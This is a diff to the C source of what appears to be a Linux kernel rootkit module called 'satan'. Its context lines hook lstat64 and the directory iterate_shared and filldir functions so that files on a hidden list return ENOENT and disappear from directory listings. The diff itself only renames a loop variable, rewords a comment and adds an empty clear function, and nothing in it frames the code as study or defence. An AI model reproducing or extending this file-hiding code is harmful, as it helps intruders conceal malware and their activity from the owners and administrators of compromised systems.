@@ -36,6 +36,7 @@ static LIST_HEAD(hidden_files_list);  // list of hidden files.
 static struct hidden_file *hidden_files_list_get(const char *path);
 static struct hidden_file *hidden_files_list_add(const char *path);
 static int hidden_files_list_del(const char *path);
+static void hidden_files_list_clear(void);
 
 
 
@@ -71,14 +72,14 @@ static int satan_dummy = 0;
 asmlinkage long satan_lstat64(const char __user *filename,
                               struct stat64 __user *statbuf)
 {
-        // Uninitialized for performance reason.
+        // Uninitialized for the sake of performance.
         struct hidden_file *f;
-        struct list_head *p;
+        struct list_head *ptr;
 
         satan_dummy = strncpy_from_user(filename_buf, filename, FILENAME_BUF_SIZE);
        
-        list_for_each(p, &hidden_files_list) {
-                f = list_entry(p, struct hidden_file, list);
+        list_for_each(ptr, &hidden_files_list) {
+                f = list_entry(ptr, struct hidden_file, list);
 
                 if (!strncmp(filename_buf, f->fullpath, strlen(f->fullpath))) {
                         return -ENOENT;
@@ -99,16 +100,16 @@ int satan_file_init(void)
 void satan_file_exit(void)
 {
         struct hidden_file *f = NULL;
-        struct list_head *p = NULL;
+        struct list_head *ptr = NULL;
         struct list_head *tmp = NULL;
 
         // Unhide the files that are left hidden by the user.
-        list_for_each_safe(p, tmp, &hidden_files_list) {
-                f = list_entry(p, struct hidden_file, list);
+        list_for_each_safe(ptr, tmp, &hidden_files_list) {
+                f = list_entry(ptr, struct hidden_file, list);
                 satan_file_unhook_iterate_shared(f);
 
                 pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
-                list_del(p);
+                list_del(ptr);
                 kfree(f->fullpath);
                 kfree(f->basename);
                 kfree(f->filename);
@@ -168,17 +169,17 @@ int satan_file_unhide(const char *path)
 
 static struct hidden_file *hidden_files_list_get(const char *path)
 {
-        // Uninitialized for performance reason.
+        // Uninitialized for the sake of performance.
         struct hidden_file *f;
-        struct list_head *p;
+        struct list_head *ptr;
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         memset(filename_buf, 0, FILENAME_BUF_SIZE);
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
-        list_for_each(p, &hidden_files_list) {
-                f = list_entry(p, struct hidden_file, list);
+        list_for_each(ptr, &hidden_files_list) {
+                f = list_entry(ptr, struct hidden_file, list);
 
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                         return f;
@@ -214,7 +215,7 @@ static struct hidden_file *hidden_files_list_add(const char *path)
 static int hidden_files_list_del(const char *path)
 {
         struct hidden_file *f = NULL;
-        struct list_head *p = NULL;
+        struct list_head *ptr = NULL;
         struct list_head *tmp = NULL;
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
@@ -222,12 +223,12 @@ static int hidden_files_list_del(const char *path)
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
-        list_for_each_safe(p, tmp, &hidden_files_list) {
-                f = list_entry(p, struct hidden_file, list);
+        list_for_each_safe(ptr, tmp, &hidden_files_list) {
+                f = list_entry(ptr, struct hidden_file, list);
 
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
                         pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
-                        list_del(p);
+                        list_del(ptr);
                         kfree(f->fullpath);
                         kfree(f->basename);
                         kfree(f->filename);
@@ -239,16 +240,21 @@ static int hidden_files_list_del(const char *path)
         return 1;
 }
 
+static void hidden_files_list_clear(void)
+{
+
+}
+
 
 
 static iterate_shared_t real_iterate_shared_list_get(const char *basename)
 {
-        // Uninitialized for performance reason.
+        // Uninitialized for the sake of performance.
         struct dir_iterate_shared *dir_is;
-        struct list_head *p;
+        struct list_head *ptr;
 
-        list_for_each(p, &real_iterate_shared_list) {
-                dir_is = list_entry(p, struct dir_iterate_shared, list);
+        list_for_each(ptr, &real_iterate_shared_list) {
+                dir_is = list_entry(ptr, struct dir_iterate_shared, list);
 
                 if (!strncmp(basename, dir_is->basename, strlen(dir_is->basename))) {
                         return dir_is->real_iterate_shared;
@@ -273,13 +279,13 @@ static void real_iterate_shared_list_add(const char *basename, void *iterate_sha
 static void real_iterate_shared_list_clear(void)
 {
         struct dir_iterate_shared *dir_is = NULL;
-        struct list_head *p = NULL;
+        struct list_head *ptr = NULL;
         struct list_head *tmp = NULL;
 
-        list_for_each_safe(p, tmp, &real_iterate_shared_list) {
-                dir_is = list_entry(p, struct dir_iterate_shared, list);
+        list_for_each_safe(ptr, tmp, &real_iterate_shared_list) {
+                dir_is = list_entry(ptr, struct dir_iterate_shared, list);
 
-                list_del(p);
+                list_del(ptr);
                 kfree(dir_is->basename);
                 kfree(dir_is);
         }
@@ -376,7 +382,7 @@ static filldir_t real_filldir = NULL;
 
 static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
 {
-        // Uninitialized for performance reason.
+        // Uninitialized for the sake of performance.
         int ret;
         iterate_shared_t real_iterate_shared;
 
@@ -408,12 +414,12 @@ static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
 static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned d_type)
 {
-        // Uninitialized for performance reason.
+        // Uninitialized for the sake of performance.
         struct hidden_file *f;
-        struct list_head *p;
+        struct list_head *ptr;
 
-        list_for_each(p, &hidden_files_list) {
-                f = list_entry(p, struct hidden_file, list);
+        list_for_each(ptr, &hidden_files_list) {
+                f = list_entry(ptr, struct hidden_file, list);
 
                 // At this point:
                 // 1. Current basename is stored in `basename`.
